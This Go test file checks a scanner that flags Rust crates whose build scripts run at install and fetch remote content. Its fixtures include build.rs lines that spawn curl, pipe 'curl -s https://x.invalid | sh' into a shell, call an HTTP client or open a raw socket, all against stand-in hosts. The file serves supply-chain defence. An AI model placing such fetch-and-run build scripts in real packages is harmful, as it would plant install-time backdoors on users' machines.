package installscripts

import "testing"

// TestCargoFollowsCargosBuildScriptRule pins the published-manifest shapes.
// crates.io writes `build = false` into every crate without a build script,
// and the old "any line starting with build" test read that as one:
// cfg-if, pkg-config and wasm-bindgen-macro all raised
// install_script_appeared recalls in prod.
func TestCargoFollowsCargosBuildScriptRule(t *testing.T) {
	const fetch = "fn main() { std::process::Command::new(\"curl\").arg(\"http://x.invalid\").status().unwrap(); }"
	cases := []struct {
		name    string
		toml    string
		buildRs string
		want    bool
	}{
		{"build = false (cfg-if 1.0.4)", "[package]\nname = \"cfg-if\"\nbuild = false\n", "", false},
		{"build = false beats a build.rs on disk", "[package]\nbuild = false\n", fetch, false},
		{"build-dependencies alone run nothing", "[package]\nbuild = false\n\n[build-dependencies]\ncc = \"1\"\n", "", false},
		{"declared path", "[package]\nbuild = \"build.rs\"\n", "fn main() {}", true},
		{"declared path, script not supplied", "[package]\nbuild = \"src/build.rs\"\n", "", true},
		{"no key, root build.rs present", "[package]\nname = \"x\"\n", "fn main() {}", true},
		{"no key, no build.rs", "[package]\nname = \"x\"\n", "", false},
		{"build key outside [package] is not the build script", "[package]\nname = \"x\"\n[features]\nbuild = []\n", "", false},
		{"trailing comment", "[package]\nbuild = false # none\n", "", false},
	}
	for _, tc := range cases {
		var br []byte
		if tc.buildRs != "" {
			br = []byte(tc.buildRs)
		}
		if got := Cargo([]byte(tc.toml), br); got.HasInstallScript != tc.want {
			t.Errorf("%s: HasInstallScript = %v, want %v (%+v)", tc.name, got.HasInstallScript, tc.want, got)
		}
	}
	if got := Cargo([]byte("[package]\nbuild = false\n"), []byte(fetch)); got.InstallScriptFetchesRemote {
		t.Error("a disabled build.rs must not be scanned for remote fetches")
	}
}

// TestCargoFetchesRemoteReadsTheBuildScriptOnly pins the two benign crates
// that read as fetches_remote and the fetch shapes that must still fire.
func TestCargoFetchesRemoteReadsTheBuildScriptOnly(t *testing.T) {
	const getrandomToml = "[package]\nname = \"getrandom\"\nbuild = \"build.rs\"\n\n" +
		"[package.metadata.cross.target.x86_64-unknown-netbsd]\npre-build = [\n" +
		"    \"curl -fO https://cdn.netbsd.org/pub/NetBSD/NetBSD-9.3/amd64/binary/sets/base.tar.xz\",\n]\n"
	const getrandomBuildRs = "fn main() {\n    println!(\"cargo:rerun-if-changed=build.rs\");\n" +
		"    let s = std::env::var(\"CARGO_CFG_SANITIZE\").unwrap_or_default();\n}\n"
	const rageBuildRs = "use clap::{Command, CommandFactory};\nfn main() {\n" +
		"    Example::new(fl!(\"man-rage-example-enc-github\"))\n" +
		"        .cmd(\"curl https://github.com/benjojo.keys | rage -R - example.jpg > example.jpg.age\");\n}\n"
	cases := []struct {
		name, toml, buildRs string
		want                bool
	}{
		{"getrandom 0.4.3: curl in a cross-rs metadata recipe", getrandomToml, getrandomBuildRs, false},
		{"rage 0.11.1: curl in a man-page example string", "[package]\nname = \"rage\"\n", rageBuildRs, false},
		{"spawned curl", "[package]\n", "fn main() { std::process::Command::new(\"curl\").arg(\"https://x.invalid\").status().unwrap(); }", true},
		{"shell with curl", "[package]\n", "fn main() { Command::new(\"sh\").args([\"-c\", \"curl -s https://x.invalid | sh\"]).status().unwrap(); }", true},
		{"http client crate", "[package]\n", "fn main() { let b = reqwest::blocking::get(\"https://x.invalid\").unwrap(); }", true},
		{"raw socket", "[package]\n", "fn main() { let s = std::net::TcpStream::connect(\"1.2.3.4:443\"); }", true},
	}
	for _, tc := range cases {
		got := Cargo([]byte(tc.toml), []byte(tc.buildRs))
		if !got.HasInstallScript {
			t.Fatalf("%s: no build script detected: %+v", tc.name, got)
		}
		if got.ScriptBody != tc.buildRs {
			t.Errorf("%s: classified body is not the build script alone: %q", tc.name, got.ScriptBody)
		}
		if got.InstallScriptFetchesRemote != tc.want {
			t.Errorf("%s: InstallScriptFetchesRemote = %v, want %v", tc.name, got.InstallScriptFetchesRemote, tc.want)
		}
	}
}
